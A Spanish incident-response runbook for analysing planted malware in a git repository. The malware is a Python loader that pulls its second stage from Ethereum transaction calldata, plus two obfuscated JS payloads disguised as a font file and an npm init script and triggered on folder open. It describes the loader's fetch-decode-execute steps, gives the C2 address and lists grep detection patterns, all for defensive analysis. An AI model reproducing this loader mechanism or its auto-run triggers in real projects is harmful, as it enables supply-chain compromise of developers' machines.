# R-01b · Procedimiento para el propietario — análisis de las cargas plantadas

Runbook para cerrar **R-01b** (la parte de R-01 que **no** puede hacerse desde el taller `src/`): desofuscar las
dos cargas JS, inspeccionar la segunda etapa en Ethereum, fijar el alcance y decidir la purga. Es un procedimiento de
**respuesta a incidente**, no una orden automática: cada fase tiene su compuerta y las irreversibles van marcadas.

**Contexto ya medido (no repetir aquí):** rastreo de procedencia en
[`informe_r01b_auditoria_20261106.md`](informe_r01b_auditoria_20261106.md); cuarentena de la zona en
[`cuarentena_r01_20261106/MANIFIESTO.md`](rescate_zona_20261105/cuarentena_r01_20261106/MANIFIESTO.md).

> **Autoría sin probar.** Los campos de autor de git no son prueba de quién escribió el código. Este procedimiento no
> atribuye a ninguna persona; busca entender el mecanismo y el alcance, no señalar culpables.

---

## 0. Reglas de seguridad que gobiernan TODO el procedimiento

1. **Nunca ejecutar el código plantado en una máquina con credenciales o red de producción.** Los tres mecanismos
   comparten un cargador de segunda etapa que hace `bytes.fromhex(...).decode()` y lo ejecuta: si corre en tu equipo de
   trabajo, lo que descargue se ejecuta con tus permisos.
2. **Análisis en caja aislada sin egress.** VM desechable, red bloqueada (ni salida a Internet ni a tu LAN), sin sesión
   iniciada en GitHub/npm/tokens, snapshots reveribles. Si hace falta leer datos públicos de la cadena, se hace **desde
   el navegador**, nunca desde la máquina que analiza el binario ofuscado.
3. **Leer, no ejecutar.** Para ver la segunda etapa NO se corre `transport.py` ni `node init`. Se reproduce su
   *lectura* con herramientas benignas (curl a un explorador + decode offline del hex), o se ve el `calldata` en la
   transacción pública. El loader es la muestra, no el analista.
4. **Integridad primero:** hashear cada artefacto ANTES de tocarlo y volver a hashear DESPUÉS. Un análisis que no
   conserva el sha256 original no es evidencia.
5. **No reescribir tags publicadas (R4) ni borrar releases (historial).** La purga (§6) es sobre ramas de trabajo y el
   árbol promocionado, y la de *historial* es decisión aparte por su radio de daño.
6. **No fusionar** `DevChatGPTIA`, `DevCursorIA`, `DevDeepSeekHarnessIA`, `DevDevinIA` ni `DevAntigravityIDEIA` hasta
   que §5 y §6 estén cerrados: cada una replanta al menos dos de los tres mecanismos.

## 1. Inventario de muestras (las tres cargas + el loader)

Todas verificadas por sha256 el 2026-11-06. Copias inertizadas ya disponibles para el análisis sin tocar `main`:
- `STM_DOC/rescate_zona_20261105/cuarentena_r01_20261106/fa-brand-400.orc`
- `STM_DOC/rescate_zona_20261105/cuarentena_r01_20261106/opencode_init`
- `STM_DOC/rescate_zona_20261105/duplicados_utils_flat/transport.py`

| id | ruta | tamaño | sha256 | disparador |
|---|---|---|---|---|
| **M1 loader** | `…/actualizacion_aeef1149/src/STM_HRTS/utils/transport.py` | 58 ln | `45f1e5c405d1253b0014a17619581d31e1b94fdca8733519d84b9795a460f53a` | `import` de módulo (vía `__main__.py:10`) |
| **M1 trigger** | `…/actualizacion_aeef1149/src/STM_HRTS/__main__.py` | — | `a7b228cc4129…` (verificado en origin/main) | `python -m STM_HRTS` |
| **M2 carga** | `…/AVHMBSC/public/fonts/fa-brand-400.orc` | 30.627 B | `89adac5ba294c6545debf8d6255a20602354d04f71809c267ae4997f1cc3bb89` | `.vscode` `folderOpen` → `node` |
| **M3 carga** | `…/STM_HRTS/opencode/init` | 32.436 B | `8f79baa43b4a51520842a206a83005a09a4a0434c07c8979dd1c426b2ed6fa1c` | `opencode/package.json` `"start": "node init …"` (línea 35 = 31.751 caracteres ofuscados) |

Si una copia local no hashea igual que la tabla, **para**: o estás ante una variante o la muestra cambió; anótalo antes
de seguir.

---

## 2. Fase A — montar el entorno aislado

Objetivo: una caja donde el código plantado no pueda ni llamar a casa ni alcanzar tus credenciales.

1. VM de análisis (no tu portátil de desarrollo). Sin carpeta compartida con el host.
2. **Sin egress**: corta la red de la VM a modo host-only/aislado. Las sondas que sí necesiten Internet (explorador de
   bloques) se hacen desde **otra** máquina o desde el navegador del host, y el resultado se copia a mano.
3. Sin sesión activa: nada de `gh auth`, claves SSH, `npm` con token, `.env`, ni perfil del visor instalado.
4. Snapshot limpio antes de cada experimento; trabajo sobre copia de las muestras, nunca sobre la original.
5. Herramientas de sólo lectura instaladas offline: `node` (para `--check`/deparser, no para correr la carga),
   `ast-grep`/`semgrep`, `js-beautify`/`webcrack` o equivalente, `hashdeep`/`sha256sum`.

**Compuerta A:** el entorno no tiene salida a red y no tiene credenciales. Si no puedes garantizar ambas, no pases a
las fases B–D.

## 3. Fase B — captura íntegra y cadena de custodia

Antes de abrir nada, congela el estado:

```bash
# desde la caja de trabajo normal (no la VM), copiar las muestras al área de análisis
mkdir -p E:/analisis_r01b/{entradas,salidas}
cp "STM_DOC/rescate_zona_20261105/cuarentena_r01_20261106/fa-brand-400.orc" E:/analisis_r01b/entradas/
cp "STM_DOC/rescate_zona_20261105/cuarentena_r01_20261106/opencode_init"    E:/analisis_r01b/entradas/
cp "STM_DOC/rescate_zona_20261105/duplicados_utils_flat/transport.py"       E:/analisis_r01b/entradas/
sha256sum E:/analisis_r01b/entradas/* > E:/analisis_r01b/entradas/CUSTODIA.sha256
```

Anota fecha, máquina y responsable en `CUSTODIA.sha256`. Esto prueba que la muestra analizada es la misma que la
cuarentenada.

## 4. Fase C — desofuscar las dos cargas JS (M2 `.orc` y M3 `init`)

Trabajo **estático** en la VM aislada. Regla: se analiza el AST, no se ejecuta el módulo.

1. **Reconocer el tipo de ofuscación** sin ejecutarlo. Inspeccionar cabecera y estructura:
   ```bash
   # ¿es texto o binario disfrazado? (el .orc imita una fuente: verificar que NO es TTF/OTF/WOFF)
   head -c 64 fa-brand-400.orc | xxd | sed -n '1,4p'
   file fa-brand-400.orc opencode_init
   wc -c fa-brand-400.orc opencode_init
   ```
   Una fuente real de FontAwesome empieza por una firma mágica (`OTTO`, `\u0000\u0001\u0000\u0000`, `wOFF`); si `fa-brand-400.orc`
   no la tiene y es JS ofuscado, queda confirmado el envoltorio (encabezado falso). Anotar los primeros bytes.
2. **Desofuscar con herramientas, no con el runtime.** Beautify + deparser sobre una **copia**:
   ```bash
   node --check fa-brand-400.orc 2>&1 | tee salidas/m2_syntax.txt   # valida sintaxis SIN ejecutar el módulo
   js-beautify fa-brand-400.orc -o salidas/m2_pretty.js
   # y para init: la cadena útil es la línea 35 (31.751 caracteres)
   sed -n '35p' opencode_init > salidas/m3_linea35.js
   js-beautify salidas/m3_linea35.js -o salidas/m3_pretty.js
   ```
   `node --check` parsea pero **no** ejecuta el cuerpo del módulo; si la muestra tuviera side-effects a nivel de módulo,
   aun así no corren con `--check`. Aun así, hazlo dentro de la VM sin red.
3. **Buscar el destino del cargador** en el JS ya legible (mismos IOC que `transport.py`, u otros distintos):
   ```bash
   grep -nE 'http|0x[0-9a-fA-F]{40}|ethplorer|infura|alchemy|publicnode|fromCharCode|atob|eval|Function\(|Buffer\.from|XMLHttpRequest|fetch\(|require\(' \
     salidas/m2_pretty.js salidas/m3_pretty.js
   ```
   Si el JS apunta a la misma dirección Ethereum o a otra, se anota en el IOC de §5.
4. **No desofuscar a mano más allá de lo que den las herramientas** si el código es hostil: documenta el método de
   ofuscación (string-array, control-flow flattening, etc.) con capturas; no hace falta reconstruir cada línea para
   cerrar el incidente, basta con determinar **qué descarga, desde dónde y qué ejecuta**.

**Compuerta C:** salida de cada carga caracterizada (endpoint, firma de lo que baja, si persiste en disco/registro). Si
alguna carga **llama a casa** con datos del equipo, eso cambia el alcance de §5: márcalo.

## 5. Fase D — inspeccionar la segunda etapa en Ethereum (sin correr `transport.py`)

El loader M1 hace, a nivel de módulo (medido por grep, líneas 10/19/27-31/38):

```
_addr  = "0x3b1574417524c11a7403c4b232CAcBb320CceBC6"
GET  https://api.ethplorer.io/getAddressTransactions/{_addr}      # lista de transacciones de la dirección
POST https://ethereum.publicnode.com  (jsonrpc eth_getTransactionByHash)
_source = bytes.fromhex(_rpc["result"]["input"][2:]).decode()     # el PAYLOAD está en el calldata de la tx
```

Lo que se ejecuta es el `input` (calldata) de una transacción. **Leer ese dato es información pública de la cadena; no
hace falta ejecutar el loader para verlo.** Hacerlo **desde el navegador**, no desde la VM de análisis:

1. Abrir (navegador, sin credenciales) `https://etherscan.io/address/0x3b1574417524c11a7403c4b232CAcBb320CceBC6`
   — o el explorador que prefieras — y listar transacciones de la dirección.
2. Para cada tx, copiar el campo **Input Data / calldata** (hex `0x…`). Decodificar **offline y sin ejecutar**:
   ```bash
   # en la VM o en cualquier sitio, NUNCA pasándolo por el python de la muestra
   echo -n "<HEX_SIN_0x>" | xxd -r -p > salidas/stage2_decodificado.txt
   file salidas/stage2_decodificado.txt; head -c 400 salidas/stage2_decodificado.txt
   ```
3. Determinar y anotar:
   - **Estado del C2:** ¿la dirección sigue recibiendo/transfiriendo? ¿la última tx es antigua (punto muerto) o reciente
     (activa)? La auditoría decía que el punto de entrega «seguía activo el 2026-11-05»; re-verificar la fecha de la
     última transacción en la cadena.
   - **Qué devuelve el calldata hoy:** un stage-2 inofensivo (texto de relleno / 404), un binario, o JS. Guardar el
     archivo decodificado como evidencia **en la VM**; no ejecutarlo.
   - Si `input` está vacío o la tx ya no existe → el canal está muerto; anótalo igual (es lo que cierra el riesgo
     operativo, aunque no borra el código del repo).
4. **No** uses la red pública para `curl` el payload desde la misma máquina que analiza el `.orc`/`init`. Separar caja
   que lee cadena (navegador) de caja que lee JS (VM offline) reduce el riesgo de encadenar un paso que sí ejecute.

**Compuerta D:** IOC de la cadena documentado (dirección, hashes de tx, calldata decodificado, estado vivo/muerto). Con
esto se sabe **qué** hacía el mecanismo y **si aún puede** hacerlo.

## 6. Fase E — reconstruir alcance y línea de tiempo

Usar la procedencia ya auditada y ampliarla a «quién/qué estuvo expuesto»:

| dato | valor medido |
|---|---|
| Loader añadido | `d510acd7f6574fe4281105242b2e5688d8bd15f9` (2026-11-01, sólo en `DevAntigravityIDEIA`) |
| Reflejo en `main` | `c395284` (mismo mensaje) → `main` + 12 ramas |
| Merge | `3caf0e7…` = **PR #47** (`base main`, `head CesarChaMal/development`), mergeCommit `75eaff8…` |
| Blobs en `origin/main` | los 4 siguen vivos (sha256 del informe) |

Reconstruir:
```bash
git log --all --oneline --diff-filter=A -- '*/STM_HRTS/utils/transport.py'      # alta real
git log --format='%H %ad %s' --date=iso -- '*/fa-brand-400.orc' '*/opencode/init'
git log -1 --format='%H %ci' origin/main                                        # en qué commit está hoy main
```
Preguntas a responder por escrito:
- **¿Llegó a binario publicado?** Comparar: ¿el `.exe` de 2.7.5/2.7.6/2.7.7 empaquetó `transport.py`, el `.orc` o `init`?
  (Revisar el contenido del PCK/binario con `--extraer`, no ejecutando.) Si sí, el alcance incluye clientes.
- **¿Qué máquinas se exponen?** Las que (a) abrieron el repo en VS Code con `folderOpen` activo, (b) pulsaron `npm start`
  en `STM_HRTS/opencode`, o (c) corrieron `python -m STM_HRTS`. R-01 ya las marca como potencialmente comprometidas.

## 7. Fase F — anunciar el alcance a las máquinas expuestas

Acción de comunicación (compartida → confirmar antes de publicar, R16). Plantilla:

> **Aviso de seguridad — WoldVirtualP2P3D (R-01b).** El árbol entre `2026-11-01` (PR #47) y `<fecha-de-cierre>` contenía
> tres mecanismos de código plantado que, al abrir la carpeta en VS Code, ejecutar `npm start` en `STM_HRTS/opencode` o
> correr `python -m STM_HRTS`, podían descargar y ejecutar una segunda etapa desde una dirección de Ethereum. No hay
> evidencia atribuida a ninguna persona. Qué hacer: (1) no usar esas ramas; (2) revisar la máquina contra el IOC
> `<dirección / hashes>`; (3) obtener la versión saneada desde `<tag/rama limpia>`. Detalles: issue #66 / <hilo>.

Publicar en el **issue #66** (estado del incidente) y, si el alcance toca clientes, en la **Discusión #67**. No tocar el
cuerpo de releases ya publicadas salvo que lo pida el propietario (regla de notas de release).

## 8. Fase G — purgar del repo (dos niveles, decisión aparte)

**G.1 Árbol promocionado (obligatorio, bajo control):** al promocionar el árbol canónico (WP-1), los cuatro marcadores
deben quedar a 0 en el commit nuevo. Verificación post-promoción (comandos corregidos el 2026-11-06, ver nota):
```bash
C=<commit-promocionado>
git grep -nI -e 'runOn' -e 'allowAutomaticTasks' $C -- ':(exclude)*STM_DOC*' ':(exclude)docs'      # 0
git ls-tree -r --name-only $C | grep -E '\.orc$|/transport\.py$|opencode/init$' | wc -l             # 0
git ls-tree -r -l $C | grep 'STM_HRTS/__main__.py'                                                  # 194 B, no 3.970 B
```
El `__main__.py` limpio ya creado (WP-0 paso 4) sustituye al de A1-1 en el árbol de trabajo; confirmar que el promocionado
lleva la versión limpia, no la de `main`.

> **Dos correcciones al comando original**, descubiertas al ejecutarlo: (1) `-e 'runOn: folderOpen'` no casa ni siquiera
> en un árbol infectado porque en `tasks.json` el valor va entre comillas (`"folderOpen"`); hay que buscar `runOn` a
> secas. (2) El pathspec `:!STM_DOC` sólo excluye un `STM_DOC/` de raíz; aquí el directorio está anidado
> (`…/src/STM_DOC`), así que se pierde el filtrado y aparecen los documentos del propio incidente. Con `:(exclude)*STM_DOC*`
> queda correcto.

**G.1 ejecutada el 2026-11-06 sobre el árbol alineado** (`0e17bfd` = merge local de `75eaff8` + `0938eb7`; el subárbol de
la instantánea es idéntico al de `DevQoderIA`, así que la comprobación vale para las dos ramas):

| Comprobación | Resultado |
|---|---|
| `*.orc` / `transport.py` / `opencode/init` por nombre | **0** (sobre 661 ficheros rastreados) |
| `runOn` · `allowAutomaticTasks` · `.orc` · `transport.py` por contenido, fuera de `STM_DOC/` y `docs/` | **0 / 0 / 0 / 0** |
| `utils.transport` en todo el árbol | 1 coincidencia y es texto de configuración: la regla `**/STM_HRTS/utils/transport.py` del `.gitignore:274` |
| `STM_HRTS/__main__.py` promocionado | 194 B, blob `b9a8cb75`, reenvío a `add_utils.__main__:main` (el de `main` pesa 3.970 B) |
| Blobs de las cargas (`080b2e7a` / `0d38d528` / `0302eeba`) alcanzables desde `main` y `DevQoderIA` | **0** en ambas ramas |

Queda pendiente la misma comprobación sobre el commit **empujado** (compuerta G.1): aquí se alineó el `main` local; el
remoto no se ha tocado (R16).

**G.2 Historial de git (opcional, radio de daño ALTO — decidir en frío):** los blobs viven en el historial desde
`c395284`/`d510acd`. Borrarlos del historial = reescribir `main` + 12 ramas (`git filter-repo`/BFG) + force-push, lo que
**invalida todos los clones y PRs abiertos** y **no puede tocar tags publicadas (R4)**. Esto NO lo exige el criterio de
aceptación de R-01 (que es de árbol, no de historial). Recomienda y deja constancia; no lo ejecutes sin una ventana
coordinada y sin decidir antes si compensa. Si se hace: antes, `git bundle`/copia de respaldo de todas las ramas.

**G.2 medido el 2026-11-06 — bloqueante que el procedimiento no contemplaba:** la contaminación no está sólo en el
historial, está **dentro del árbol de una release publicada**. `v2.7.6` → `3caf0e7` (merge del PR #47, 2026-11-02) y ese
commit **es la tag publicada**; su árbol lleva las tres cargas bajo `actualizacion_aeef1149` con los sha256 de §1
(`45f1e5c4…` 1.585 B · `89adac5b…` 30.627 B · `8f79baa4…` 32.436 B). Purgar el historial obliga a reescribir o borrar
`v2.7.6`, y eso choca con R4 y con la regla de no tocar el cuerpo de releases ya publicadas. La 2.7.7 (`v2.7.7` →
`294a72a`) está limpia de los cuatro marcadores.

Inventario de alcance medido (`git rev-list --objects` por ref, sin filtro):

- **25 de 116 refs** alcanzan alguno de los tres blobs: `origin/main` (los 3), `origin/DevAntigravityIDEIA` (los 3),
  `origin/DevChatGPTIA` / `origin/DevCursorIA` / `origin/DevDeepSeekHarnessIA` / `origin/DevDevinIA` (2 cada una — son las
  ramas prohibidas por §0.6), `DevAntigravityIDEIA` local, un `stash`, y las tags `rescate/20261105/main`,
  `rescate/20261105/DevAntigravityIDEIA` y **`v2.7.6`**.
- El `main` alineado (`0e17bfd`) y `DevQoderIA` (`0938eb7`) alcanzan **0**: la reescritura sólo hace falta en las refs de
  arriba, no en el tronco limpio.
- El historial ya está truncado por la reducción de peso del 2026-10-30: `origin/main` son **215 commits** con dos raíces,
  la más antigua `575fccb` (2026-10-19). Reescribir no recupera nada de antes de esa fecha.
- Herramientas: **`git filter-repo` no está instalado** (tampoco el módulo Python `git_filter_repo`) y **`bfg` no está**.
  Ninguna purga es ejecutable hoy sin instalar código de terceros.

**Decisión registrada (2026-11-06): NO se ejecuta G.2**, y no por prudencia genérica sino porque está bloqueado por R4.
Si el propietario quiere seguir, el orden obligatorio es: (1) decidir en frío qué se hace con `v2.7.6` —retirar la
release y su tag, o asumir formalmente que queda contaminada—; (2) `git bundle --all` de las 116 refs como único
respaldo (el `.git` pesa ≈632 MiB, `E:` tiene ≈169 GiB libres); (3) instalar `git-filter-repo` y ejecutarlo en un clon
nuevo, nunca sobre este árbol compartido; (4) aviso previo a quien tenga clones/PRs abiertos; (5) fuerza de los extremos
en `origin` — **eso es un force-push sobre `main`, y no lo hago yo**: lo ejecuta el dueño, consciente del radio; (6)
petición a soporte de GitHub para purgar los objetos ya publicados, porque borrarlos del historial propio no los
despublica: siguen en forks, caches y en la propia release. Con `v2.7.6` en pie, G.2 no cierra el acceso a los blobs:
sólo cambia de sitio la evidencia. Alternativa de radio bajo, que sí cierra el criterio de R-01: G.1 + Fase F (aviso
público en #66 con los sha256) + cuarentena y `.gitignore` §18, que es lo que está hecho.

**Compuerta G:** G.1 se valida tras el push del propietario. G.2 es decisión explícita, reversible sólo con respaldo
previo, y con aviso a quien tenga clones.

## 9. Cierre de R-01

R-01 queda cerrado cuando se cumplen **todas**:
- [ ] Fase C: las dos cargas JS caracterizadas (qué descargan/ejecutan/persisten) con evidencia en `salidas/`.
- [ ] Fase D: IOC de Ethereum documentado y estado del C2 (vivo/muerto) anotado.
- [ ] Fase E: alcance fijado (¿llegó a binario? qué máquinas) por escrito.
- [ ] Fase F: aviso publicado en #66 (y #67 si toca clientes).
- [ ] Fase G.1: árbol promocionado con los cuatro marcadores a 0 (se comprueba en el commit nuevo). **Medido y a 0 en el
      `main` local alineado (`0e17bfd`) el 2026-11-06 — tabla en §8; falta repetir la comprobación sobre el commit
      empujado, que es la compuerta.**
- [ ] Decisión registrada sobre G.2 (purga de historial): hacer o no, y por qué. **Registrada la propuesta el
      2026-11-06: NO hacer, porque `v2.7.6` (tag publicada) contiene las tres cargas en su propio árbol y R4 impide
      reescribirla; con esa tag en pie la purga no cierra el acceso a los blobs. Pendiente de la confirmación del
      propietario.**
- [ ] Actualizar el checkbox **R-01 / R-01b** en el issue #66 con los sha256 y la fecha de cierre.

Mientras alguna casilla esté abierta, **R-01 sigue en pie** y no se promueven las ramas de §0.6 ni se recompila para
«arreglar» una release ya publicada (no invalidar `SHA256SUMS`/`release.json`).

## 10. Plantilla de registro de evidencia (copiar por cada hallazgo)

```
fecha (UTC):
fase (C/D/E/G):
máquina (VM aislada sí/no, con/sin red):
artefacto + sha256 (antes):
comando ejecutado (exacto):
salida relevante:
conclusión (qué hace / endpoint / persistencia):
impacto en alcance:
artefacto + sha256 (después, si se modificó):
responsable:
```
